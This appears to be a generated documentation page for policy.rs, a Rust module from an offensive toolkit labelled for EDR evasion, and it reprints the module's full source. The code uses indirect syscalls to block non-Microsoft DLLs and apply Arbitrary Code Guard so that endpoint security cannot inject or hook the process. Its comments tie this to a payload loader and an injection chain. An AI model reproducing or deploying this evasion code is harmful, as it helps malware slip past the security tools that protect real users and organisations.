# crowd — policy.rs  (🅱️ B TIER — BlockDLL policy utility)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/policy.rs` |
| **Lines** | 101 |
| **Tier** | B |
| **Cards** | T009-edr-evasion |
| **Role** | Block-DLL + ACG policy |
| **Unsafe blocks** | 4 |

## Purpose

# crowd — policy.rs  (🅱️ B TIER — BlockDLL policy utility)

Process-level hardening policies applied before injection:
- **Block Non-Microsoft DLLs**: `ProcessSignaturePolicy` via `NtSetInformationProcess`
→ EDR cannot inject its own DLL into this process.
- **ACG (Arbitrary Code Guard)**: `ProcessDynamicCodePolicy`
→ EDR cannot write hooks into RX pages.

Both policies are applied via direct syscall (RecycledGate) to avoid
calling ntdll wrappers that may already be hooked.

## Constants

- `PROCESS_MITIGATION_POLICY_CLASS`: `u32` = `52`
- `MITIGATION_POLICY_SIGNATURE`: `u32` = `8` — ProcessSignaturePolicy
- `MITIGATION_POLICY_DYNAMIC_CODE`: `u32` = `2` — ProcessDynamicCodePolicy

## Types

### struct `ProcessSignaturePolicyInfo` (line 37)

### struct `ProcessDynamicCodePolicyInfo` (line 44)

## Public API

### `apply_block_dll_policy` `unsafe` (line 62)
```rust
pub unsafe fn apply_block_dll_policy() -> bool
```
Prevents non-Microsoft-signed DLLs from loading into this process.
Once set, EDR/AV cannot inject their native DLL implant.

### `apply_acg_policy` `unsafe` (line 77)
```rust
pub unsafe fn apply_acg_policy() -> bool
```
Prevents the process from mapping new executable memory pages dynamically.
Blocks EDR from writing inline hooks to .text after process start.

### `harden_process` `unsafe` (line 96)
```rust
pub unsafe fn harden_process() -> (bool, bool)
```
Apply both hardening policies.
Returns (block_dll_ok, acg_ok).

NOTE: ACG (dynamic code guard) will prevent VirtualProtect(PAGE_EXECUTE_*) on new regions.
If your payload loader needs to allocate RX memory AFTER applying ACG, apply ACG LAST
or skip it. The chain applies Block-DLL first, then ACG after module map is complete.

## Internal Functions

- `set_process_info` (unsafe) — Call NtSetInformationProcess via RecycledGate. (line 54)

## Key Dependencies

- `use crate::recycled::invoke;`
- `use crate::resolve::compute_hash;`
- `use windows::Win32::System::Threading::GetCurrentProcess;`

## Full Source

```rust
//! # crowd — policy.rs  (🅱️ B TIER — BlockDLL policy utility)
//!
//! Process-level hardening policies applied before injection:
//!   - **Block Non-Microsoft DLLs**: `ProcessSignaturePolicy` via `NtSetInformationProcess`
//!     → EDR cannot inject its own DLL into this process.
//!   - **ACG (Arbitrary Code Guard)**: `ProcessDynamicCodePolicy`
//!     → EDR cannot write hooks into RX pages.
//!
//! Both policies are applied via direct syscall (RecycledGate) to avoid
//! calling ntdll wrappers that may already be hooked.

#![allow(dead_code)]

use crate::recycled::invoke;
use crate::resolve::compute_hash;
use std::ffi::c_void;
use windows::Win32::System::Threading::GetCurrentProcess;

// NtSetInformationProcess ProcessInformationClass for mitigation policies.
// ProcessMitigationPolicy = 52 — the ONLY correct class for setting mitigation
// policies. The sub-policy type is specified via the PROCESS_MITIGATION_POLICY
// discriminant field, NOT via separate ProcessInformationClass values.
const PROCESS_MITIGATION_POLICY_CLASS: u32 = 52;

// Sub-policy types (PROCESS_MITIGATION_POLICY enum discriminants):
// These go into the `policy` field of the mitigation struct, NOT as the
// ProcessInformationClass parameter.
const MITIGATION_POLICY_SIGNATURE:    u32 = 8;  // ProcessSignaturePolicy
const MITIGATION_POLICY_DYNAMIC_CODE: u32 = 2;  // ProcessDynamicCodePolicy

// ── Mitigation policy structs ────────────────────────────────────────────────
// NtSetInformationProcess(ProcessMitigationPolicy) expects:
//   struct { PROCESS_MITIGATION_POLICY Policy; union { ...sub-policy flags... }; }
// The `policy` field tells the kernel which sub-policy to apply.

#[repr(C)]
struct ProcessSignaturePolicyInfo {
    policy: u32,   // discriminant: MITIGATION_POLICY_SIGNATURE (8)
    // bit 0: MicrosoftSignedOnly, bit 1: StoreSignedOnly, bit 2: MitigationOptIn
    flags: u32,
}

#[repr(C)]
struct ProcessDynamicCodePolicyInfo {
    policy: u32,   // discriminant: MITIGATION_POLICY_DYNAMIC_CODE (2)
    // bit 0: ProhibitDynamicCode
    flags: u32,
}

/// Call NtSetInformationProcess via RecycledGate.
/// `info_class` — ProcessInformationClass enum value.
/// `data`       — pointer to policy struct.
/// `data_len`   — size of policy struct in bytes.
unsafe fn set_process_info(info_class: u32, data: *const c_void, data_len: u32) -> i32 {
    let h = GetCurrentProcess().0 as usize;
    let args = [h, info_class as usize, data as usize, data_len as usize];
    invoke(compute_hash("NtSetInformationProcess"), 4, &args)
}

/// Prevents non-Microsoft-signed DLLs from loading into this process.
/// Once set, EDR/AV cannot inject their native DLL implant.
pub unsafe fn apply_block_dll_policy() -> bool {
    let policy = ProcessSignaturePolicyInfo {
        policy: MITIGATION_POLICY_SIGNATURE,
        flags: 0x1, // MicrosoftSignedOnly
    };
    let status = set_process_info(
        PROCESS_MITIGATION_POLICY_CLASS,
        &policy as *const _ as *const c_void,
        std::mem::size_of_val(&policy) as u32,
    );
    status == 0
}

/// Prevents the process from mapping new executable memory pages dynamically.
/// Blocks EDR from writing inline hooks to .text after process start.
pub unsafe fn apply_acg_policy() -> bool {
    let policy = ProcessDynamicCodePolicyInfo {
        policy: MITIGATION_POLICY_DYNAMIC_CODE,
        flags: 0x1, // ProhibitDynamicCode
    };
    let status = set_process_info(
        PROCESS_MITIGATION_POLICY_CLASS,
        &policy as *const _ as *const c_void,
        std::mem::size_of_val(&policy) as u32,
    );
    status == 0
}

/// Apply both hardening policies.
/// Returns (block_dll_ok, acg_ok).
///
/// NOTE: ACG (dynamic code guard) will prevent VirtualProtect(PAGE_EXECUTE_*) on new regions.
/// If your payload loader needs to allocate RX memory AFTER applying ACG, apply ACG LAST
/// or skip it. The chain applies Block-DLL first, then ACG after module map is complete.
pub unsafe fn harden_process() -> (bool, bool) {
    let block = apply_block_dll_policy();
    // ACG applied AFTER module loading so the overloaded DLL can still execute
    // — caller must call apply_acg_policy() manually post-load if desired.
    (block, false)
}

```